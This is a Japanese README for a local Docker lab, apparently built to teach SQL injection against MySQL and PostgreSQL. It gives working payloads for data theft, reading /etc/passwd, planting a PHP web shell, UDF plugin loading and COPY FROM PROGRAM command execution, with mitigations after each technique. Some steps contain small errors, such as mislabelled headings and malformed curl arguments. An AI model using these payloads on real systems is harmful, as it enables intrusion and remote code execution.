# SQL Injection Playground

SQL Injectionに関するペネトレテクニック学習用Docker環境


<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=false} -->

<!-- code_chunk_output -->

- [SQL Injection Playground](#sql-injection-playground)
  - [Quick Start](#quick-start)
  - [MySQL](#mysql)
    - [Normal request](#normal-request)
    - [Basic SQL Injection](#basic-sql-injection)
      - [UNION SELECT](#union-select)
      - [複文実行](#複文実行)
    - [LOAD_FILE - Read file](#load_file-read-file)
      - [前提条件](#前提条件)
      - [手順](#手順)
        - [Step 1: LOAD_FILEで読みだした内容をSELECT文で出力する](#step-1-load_fileで読みだした内容をselect文で出力する)
      - [対策](#対策)
    - [INTO OUTFILE - Write a PHP file to RCE](#into-outfile-write-a-php-file-to-rce)
      - [前提条件](#前提条件-1)
      - [手順](#手順-1)
        - [Step 1: WebShell入りのPHPファイルを `INTO OUTFILE` で書き込む](#step-1-webshell入りのphpファイルを-into-outfile-で書き込む)
        - [Step 2: PHP経由でOSコマンドを実行する](#step-2-php経由でosコマンドを実行する)
      - [対策](#対策-1)
    - [UDF - Write a plugin file to RCE](#udf-write-a-plugin-file-to-rce)
      - [前提条件](#前提条件-2)
      - [アイデア](#アイデア)
      - [手順](#手順-2)
        - [Step 1: プラグインディレクトリを特定する](#step-1-プラグインディレクトリを特定する)
        - [Step 2: プラグインバイナリを書き込む](#step-2-プラグインバイナリを書き込む)
        - [Step 3: バイナリをロードしてUDFを作成する](#step-3-バイナリをロードしてudfを作成する)
        - [Step 4: UDFを経由でOSコマンドを実行する](#step-4-udfを経由でosコマンドを実行する)
      - [対策](#対策-2)
  - [PostgreSQL](#postgresql)
    - [通常のリクエスト](#通常のリクエスト)
    - [Basic SQL Injection](#basic-sql-injection-1)
      - [UNION SELECT](#union-select-1)
      - [複文実行](#複文実行-1)
    - [lo_import - Read file](#lo_import-read-file)
      - [前提条件](#前提条件-3)
      - [手順](#手順-3)
        - [Step 1: 任意のファイルをlo_importでロードする](#step-1-任意のファイルをlo_importでロードする)
        - [Step 2: ファイル内容を読み出す](#step-2-ファイル内容を読み出す)
      - [対策](#対策-3)
    - [lo_export - Write a PHP file to RCE](#lo_export-write-a-php-file-to-rce)
      - [前提条件](#前提条件-4)
      - [手順](#手順-4)
        - [Step 1: Large Objectを作る](#step-1-large-objectを作る)
        - [Step 2: Large Objectを書き換える](#step-2-large-objectを書き換える)
        - [Step 3: ファイル内容を書き出す](#step-3-ファイル内容を書き出す)
        - [Step 4: PHP経由でOSコマンドを実行する](#step-4-php経由でosコマンドを実行する)
      - [対策](#対策-4)
    - [COPY TO/FROM PROGRAM - RCE](#copy-tofrom-program-rce)
      - [前提条件](#前提条件-5)
      - [アイデア](#アイデア-1)
      - [手順](#手順-5)
        - [Step 1: Postgresバージョンを確認](#step-1-postgresバージョンを確認)
        - [Step 2: コマンド結果を保存するテーブルを作成](#step-2-コマンド結果を保存するテーブルを作成)
        - [Step 3: COPY FROM PROGRAMを使用してコマンドを実行](#step-3-copy-from-programを使用してコマンドを実行)
        - [Step 4: UNION SELECTで結果を読み出し](#step-4-union-selectで結果を読み出し)
      - [対策](#対策-5)
    - [UDF - Write a plugin file to RCE](#udf-write-a-plugin-file-to-rce-1)
      - [対策](#対策-6)
      - [アイデア](#アイデア-2)
      - [手順](#手順-6)
        - [Step 1: プラグインバイナリを作成する](#step-1-プラグインバイナリを作成する)
        - [Step 2: Large Objectを作る](#step-2-large-objectを作る)
        - [Step 3: Large Objectを書き換える](#step-3-large-objectを書き換える)
        - [Step 4: プラグインバイナリを書き込む](#step-4-プラグインバイナリを書き込む)
        - [Step 5: バイナリをロードしてUDFを作成する](#step-5-バイナリをロードしてudfを作成する)
        - [Step 6: UDF経由でOSコマンドを実行する](#step-6-udf経由でosコマンドを実行する)
      - [対策](#対策-7)

<!-- /code_chunk_output -->



## Quick Start

```
docker-compose up
```

```
less +F ./log/mysql/query.log
```

```
open http://localhost:8888/mysql.php
open http://localhost:8888/postgres.php
```

## MySQL

### Normal request

```
http://localhost:8888/mysql.php?user=admin&pass=p4ssw0rd
```


### Basic SQL Injection

#### UNION SELECT

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT 1, 2, 3;--+
```

```
http://localhost:8888/mysql.php?user=&pass=' UNION ALL SELECT id, username, password FROM users;--+
```


#### 複文実行

```
http://localhost:8888/mysql.php?user=&pass='; INSERT INTO users VALUES (1337, 'pwned', 'hello');--+
```

```
http://localhost:8888/mysql.php?user=&pass='; DELETE FROM users WHERE username='pwned';--+
```


### LOAD_FILE - Read file

#### 前提条件

- secure-file-privが無効化されている場合（MySQL 5.7.5以前はデフォルト無効）


#### 手順

##### Step 1: LOAD_FILEで読みだした内容をSELECT文で出力する

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT NULL,NULL,load_file('/etc/passwd');--+
```


#### 対策

- secure-file-privオプションを有効化してファイル書き込みを禁止する


### INTO OUTFILE - Write a PHP file to RCE

#### 前提条件

- MySQLがPHPの公開ディレクトリにアクセスできる場合
- secure-file-privが無効化されている場合（MySQL 5.7.5以前はデフォルト無効）


#### 手順

##### Step 1: WebShell入りのPHPファイルを `INTO OUTFILE` で書き込む

```php
<?php $param=$_GET["cmd"]; echo shell_exec($param);
```

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT NULL,NULL,'<?php $param=$_GET["cmd"]; echo shell_exec($param);' INTO OUTFILE '/var/www/html/poc.php
```


##### Step 2: PHP経由でOSコマンドを実行する

```
http://localhost:8888/poc.php?cmd=id
```

```
\N \N uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


#### 対策

- MySQLとWebサーバは分離した構成にする
- secure-file-privオプションを有効化してファイル書き込みを禁止する


### UDF - Write a plugin file to RCE

#### 前提条件

- 複文実行できる設定になっている場合
- プラグインディレクトリにMySQLのプロセスが書き込み可能な場合


#### アイデア

- MySQLではC言語でプラグインを書いて、独自のSQL関数（UDF）を実装することができる
- C言語内では当然任意のコードが実行できるので、OSコマンドを実行するUDFを作り出すことも可能
  - 例. https://www.exploit-db.com/exploits/1518
- MySQLがプラグインディレクトリに書き込む権限を持っている場合、悪意あるUDFを含むバイナリをアップロードし、プラグインとしてロードさせることで任意コード実行ができる
- コンパイル済みのOSコマンド実行UDFも世の中に転がっている
  - 例. https://www.exploit-db.com/exploits/46249


#### 手順

##### Step 1: プラグインディレクトリを特定する

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT @@plugin_dir,'','';--+
```

```
id=/usr/lib/mysql/plugin/, username=, password=
```


##### Step 2: プラグインバイナリを書き込む

GETリクエストだとURI長の制限に引っかかるため、POSTリクエストで投げる。

もし、GETリクエストしか使えない場合は、バイナリを分割してDB内に格納し、後から連結することで制限を回避できる。

```
curl http://localhost:8888/mysql.php \
  -d 'user=' \
  -d "pass='; SELECT BINARY /*ここに16進数表現でバイナリを入れる（例. 0x41424344）*/ into dumpfile '/usr/lib/mysql/plugin/mysql_udfsys.so';--+"
```


##### Step 3: バイナリをロードしてUDFを作成する

バイナリ内のsys_execシンボルの関数がUDFとして実行できるようになる。

```
http://localhost:8888/mysql.php?user=&pass='; CREATE FUNCTION sys_exec RETURNS int SONAME 'mysql_udfsys.so';--+
```


##### Step 4: UDFを経由でOSコマンドを実行する

コマンド実行結果が分からないので、ファイルに書き込んでコマンド実行の成功を確かめる。

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT sys_exec('echo PWNED! > /var/www/html/udf_poc'), '', '';--+
```


#### 対策

- 複文実行を禁止するオプションを有効化するか、sqliなどを使用する
- MySQLプロセスの権限を必要最小限に絞る
- secure-file-privオプションを有効化してファイル書き込みを禁止する


## PostgreSQL

### 通常のリクエスト

```
http://localhost:8888/postgres.php?user=admin&pass=p4ssw0rd
```


### Basic SQL Injection

#### UNION SELECT

```
http://localhost:8888/postgres.php?user=&pass=' UNION ALL SELECT 1,'2','3';--+
```

```
http://localhost:8888/postgres.php?user=&pass=' UNION ALL SELECT id, username, password FROM users;--+
```


#### 複文実行

```
http://localhost:8888/postgres.php?user=&pass='; INSERT INTO users VALUES (1337, 'pwned', 'hello');--+
```

```
http://localhost:8888/postgres.php?user=&pass='; DELETE FROM users WHERE username='pwned';--+
```


### lo_import - Read file

#### 前提条件

- lo_compat_privilegesが有効化されていること（バージョン9.0以前はデフォルト有効）


#### 手順

##### Step 1: 任意のファイルをlo_importでロードする

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1,'',''||lo_import('/etc/passwd',1339);--
```


##### Step 2: ファイル内容を読み出す

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1, '', CAST(data AS TEXT) FROM pg_largeobject;--+
```


#### 対策

- lo_compat_privilegesオプションを無効化してファイルアクセスを禁止する


### lo_export - Write a PHP file to RCE

#### 前提条件

- lo_compat_privilegesが有効化されていること（バージョン9.0以前はデフォルト有効）
- PostgreSQLがPHPの公開ディレクトリにアクセスできる場合


#### 手順

##### Step 1: Large Objectを作る

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1,'',''||lo_import('/etc/passwd',1337);--+
```


##### Step 2: Large Objectを書き換える

```php
<?php $param=$_GET["cmd"]; echo shell_exec($param);
```

16進数でエンコードして送り込む。

```
http://localhost:8888/postgres.php?user=&pass='; UPDATE pg_largeobject SET pageno=0, data=decode('3c3f7068702024706172616d3d245f4745545b22636d64225d3b206563686f207368656c6c5f657865632824706172616d293b','hex') WHERE loid=1337;--+ 
```


##### Step 3: ファイル内容を書き出す

```
http://localhost:8888/postgres.php?user=&pass='; SELECT lo_export(1337,'/var/www/html/poc.php');--+
```


##### Step 4: PHP経由でOSコマンドを実行する

```
http://localhost:8888/poc.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


#### 対策

- PostgreSQLとWebサーバは分離した構成にする
- lo_compat_privilegesオプションを無効化してファイルアクセスを禁止する


### COPY TO/FROM PROGRAM - RCE

#### 前提条件

- Postgres 9.3 以降が使用されていること
- `pg_execute_server_program`を持ったユーザ、もしくはスーパーユーザーとしてSQL文が実行できる


#### アイデア

- Postgres 9.3 以降は COPY TO/FROM PROGRAM 機能によって簡単にRCEができる
  - https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5


#### 手順

##### Step 1: Postgresバージョンを確認

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 0,version(),'';--+
```

```
id=0, username=PostgreSQL 11.12 (Debian 11.12-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit, password=
```


##### Step 2: コマンド結果を保存するテーブルを作成

```
http://localhost:8888/postgres.php?user=&pass=';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);--+
```


##### Step 3: COPY FROM PROGRAMを使用してコマンドを実行

```
http://localhost:8888/postgres.php?user=&pass=';COPY cmd_exec FROM PROGRAM 'uname -a';--+
```


##### Step 4: UNION SELECTで結果を読み出し

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 0,cmd_output,'' FROM cmd_exec;--+
```

```
id=0, username=Linux e40ad9fb08b1 5.10.25-linuxkit #1 SMP Tue Mar 23 09:27:39 UTC 2021 x86_64 GNU/Linux, password=
```


#### 対策

- postgresユーザに必要最小限の権限のみを付与する


### UDF - Write a plugin file to RCE

#### 対策

- lo_compat_privilegesが有効化されていること（バージョン9.0以前はデフォルト有効）

#### アイデア

- https://afinepl.medium.com/postgresql-code-execution-udf-revisited-3b08412f47c1
- https://github.com/sqlmapproject/udfhack/tree/master/linux/lib_postgresqludf_sys
- 基本的な考え方はMySQLのUDFと同じだが、Large Objectの仕様のためバイナリファイルを書き込むために工夫が必要


#### 手順

##### Step 1: プラグインバイナリを作成する

dockerコマンドでPostgreSQLのコンテナ内に入る。

ここでは練習のためターゲットサーバ内でコンパイルを実行するが、ペンテストの際はターゲットサーバと同じアーキテクチャ、PostgreSQLバージョンで他にサーバを建てて、その中でコンパイルする。

```
docker exec -it sqli-playground_postgres_1 /bin/sh
```


プラグインバイナリをコンパイルする。

```
cd /tmp
git clone https://github.com/sqlmapproject/udfhack
cd ./udfhack/linux/lib_postgresqludf_sys/
gcc lib_postgresqludf_sys.c -I$(pg_config --includedir-server) -fPIC -shared -o pg_udfsys.so
```


プラグインバイナリをホスト側に持ち出す

```
exit
docker cp sqli-playground_postgres_1:/tmp/udfhack/linux/lib_postgresqludf_sys/pg_udfsys.so .
```


##### Step 2: Large Objectを作る

```
http://localhost:8888/postgres.php?user=&pass=';SELECT lo_unlink(1337);--+
```

```
http://localhost:8888/postgres.php?user=&pass=';SELECT lo_import('/etc/passwd',1337);--+
```


##### Step 3: Large Objectを書き換える

Large Objectのページサイズは2048なので一度に2048バイトしか書き込むことができない。

バイナリを2048バイトずつに分割し、ページをPG_LARGEOBJECTテーブルへ順番に追加していく。

```
curl http://localhost:8888/postgres.php \
  -d 'user=' \
  -d "pass=';UPDATE pg_largeobject SET pageno=0, data=decode(/*hexエンコードしたデータ（range: 0-2047）*/,'hex') WHERE loid=1337;--+"
```

```
curl http://localhost:8888/postgres.php \
  -d 'user=' \
  -d "';INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (1337, 1, decode(/*hexエンコードしたデータ（range: 2048-4095）*/,'hex'));--+"

curl http://localhost:8888/postgres.php \
  -d 'user=' \
  -d "';INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (1337, 1, decode(/*hexエンコードしたデータ（range: 4096-6144）*/,'hex'));--+"

...
```


##### Step 4: プラグインバイナリを書き込む

```
http://localhost:8888/postgres.php?user=&pass=';SELECT lo_export(1337, '/tmp/pg_udfsys.so');--+
```


##### Step 5: バイナリをロードしてUDFを作成する

```
http://localhost:8888/postgres.php?user=&pass=';CREATE OR REPLACE FUNCTION exec(char) RETURNS CHAR as '/tmp/pg_udfsys.so','sys_eval' language c strict;--+
```


##### Step 6: UDF経由でOSコマンドを実行する

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 0,exec('id'),'';--+
```

```
id=0, username=uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert), password=
```


#### 対策

- lo_compat_privilegesオプションを無効化してファイルアクセスを禁止する


